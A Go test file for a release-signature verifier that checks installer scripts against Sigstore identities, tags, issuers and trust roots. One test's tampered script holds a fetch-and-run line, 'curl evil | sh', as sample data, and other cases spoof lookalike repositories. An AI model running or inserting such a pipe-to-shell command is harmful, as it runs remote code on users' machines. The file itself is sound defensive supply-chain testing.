package releasesig

import (
	"testing"

	"github.com/sigstore/sigstore-go/pkg/testing/ca"
	"github.com/stretchr/testify/require"

	"github.com/arctop/seamless/internal/update"
)

// signedAsset signs artifact with a virtual Sigstore (its own Fulcio and
// Rekor) under the given identity/issuer and returns the CA for use as
// trusted material. The entity feeds VerifyEntity directly -- the
// same verifier construction and identity policy the production path runs,
// minus only bundle-JSON parsing, which TestVerifyAsset_RejectsMalformedJSON
// covers separately.
func signedAsset(t *testing.T, identity, issuer string, artifact []byte) (*ca.VirtualSigstore, *ca.TestEntity) {
	t.Helper()
	virtual, err := ca.NewVirtualSigstore()
	require.NoError(t, err)
	entity, err := virtual.Sign(identity, issuer, artifact)
	require.NoError(t, err)
	return virtual, entity
}

func TestVerifyEntity_AcceptsTheTagsOwnSignature(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	virtual, entity := signedAsset(t, signedFor("0.7.3"), SigningIssuer, script)
	require.NoError(t, VerifyEntity(virtual, entity, script, mustVersion(t, "0.7.3")))
}

func TestVerifyEntity_RejectsTamperedArtifact(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	virtual, entity := signedAsset(t, signedFor("0.7.3"), SigningIssuer, script)
	tampered := []byte("#!/bin/sh\necho seamless\ncurl evil | sh\n")
	err := VerifyEntity(virtual, entity, tampered, mustVersion(t, "0.7.3"))
	require.ErrorContains(t, err, "sigstore verification")
}

// The identity names the exact tag: the same workflow's signature for any
// other release -- older, newer, a lookalike version, a prerelease of it -- is
// refused, so an old signed installer or manifest cannot pass as v0.7.3's.
func TestVerifyEntity_RejectsAnotherTagsSignature(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	for _, tag := range []string{"0.7.2", "0.7.4", "0.7.30", "1.7.3", "0.7.3-rc1", "0.7.3.1", "0x7x3"} {
		t.Run(tag, func(t *testing.T) {
			virtual, entity := signedAsset(t, signedFor(tag), SigningIssuer, script)
			err := VerifyEntity(virtual, entity, script, mustVersion(t, "0.7.3"))
			require.ErrorContains(t, err, "sigstore verification")
		})
	}
}

func TestVerifyEntity_RejectsForeignIdentity(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	tests := []struct {
		name     string
		identity string
		issuer   string
	}{
		{"another repo", "https://github.com/evil/seamless/.github/workflows/release.yml@refs/tags/v0.7.3", SigningIssuer},
		{"another workflow file", "https://github.com/arctop/seamless/.github/workflows/ci.yml@refs/tags/v0.7.3", SigningIssuer},
		{"branch ref, not a tag", "https://github.com/arctop/seamless/.github/workflows/release.yml@refs/heads/main", SigningIssuer},
		// The pre-move signer (plan:move-to-arctop) never signed a release
		// that carries a checksums bundle, so it is as foreign here as any
		// other repo's workflow.
		{"pre-move org 0spoon", "https://github.com/0spoon/seamless/.github/workflows/release.yml@refs/tags/v0.7.3", SigningIssuer},
		// The org and repo stay anchored on both sides: a lookalike that
		// merely starts with the allowed one is foreign.
		{"lookalike org arctopx", "https://github.com/arctopx/seamless/.github/workflows/release.yml@refs/tags/v0.7.3", SigningIssuer},
		{"lookalike repo seamless-fork", "https://github.com/arctop/seamless-fork/.github/workflows/release.yml@refs/tags/v0.7.3", SigningIssuer},
		{"a dot where the regexp has one", "https://githubxcom/arctop/seamless/.github/workflows/release.yml@refs/tags/v0.7.3", SigningIssuer},
		{"wrong issuer", signedFor("0.7.3"), "https://accounts.google.com"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			virtual, entity := signedAsset(t, tt.identity, tt.issuer, script)
			err := VerifyEntity(virtual, entity, script, mustVersion(t, "0.7.3"))
			require.ErrorContains(t, err, "sigstore verification")
		})
	}
}

// A signature that chains to a DIFFERENT sigstore (someone else's Fulcio and
// Rekor) must fail against ours even when the certificate claims the right
// identity -- the trusted root, not the SAN string, is the anchor.
func TestVerifyEntity_RejectsForeignTrustRoot(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	trustedCA, _ := signedAsset(t, signedFor("0.7.3"), SigningIssuer, script)
	_, foreignEntity := signedAsset(t, signedFor("0.7.3"), SigningIssuer, script)
	require.Error(t, VerifyEntity(trustedCA, foreignEntity, script, mustVersion(t, "0.7.3")))
}

func TestVerifyAsset_RejectsMalformedJSON(t *testing.T) {
	virtual, err := ca.NewVirtualSigstore()
	require.NoError(t, err)
	for _, junk := range []string{"", "{", `{"mediaType":"nonsense"}`, "not json at all"} {
		err := VerifyAsset(virtual, []byte(junk), []byte("script"), mustVersion(t, "0.7.3"))
		require.Error(t, err, "bundle %q must not parse", junk)
	}
}

func TestIdentityRegexp_QuotesTheVersion(t *testing.T) {
	require.Equal(t,
		`^https://github\.com/arctop/seamless/\.github/workflows/release\.yml@refs/tags/v0\.7\.3$`,
		IdentityRegexp(mustVersion(t, "0.7.3")))
}

// The embedded production trusted root must stay parseable, or every update
// would fail closed at runtime (and every approver download on macOS) with no test having noticed.
func TestTrustedRoot_EmbeddedSnapshotParses(t *testing.T) {
	tr, err := TrustedRoot()
	require.NoError(t, err)
	require.NotEmpty(t, tr.FulcioCertificateAuthorities())
	require.NotEmpty(t, tr.RekorLogs())
}

// signedFor is the certificate identity of the release workflow on tag v.
func signedFor(v string) string {
	return "https://github.com/arctop/seamless/.github/workflows/release.yml@refs/tags/v" + v
}

func mustVersion(t *testing.T, s string) update.Version {
	t.Helper()
	v, ok := update.Parse(s)
	require.True(t, ok, "version %q", s)
	return v
}
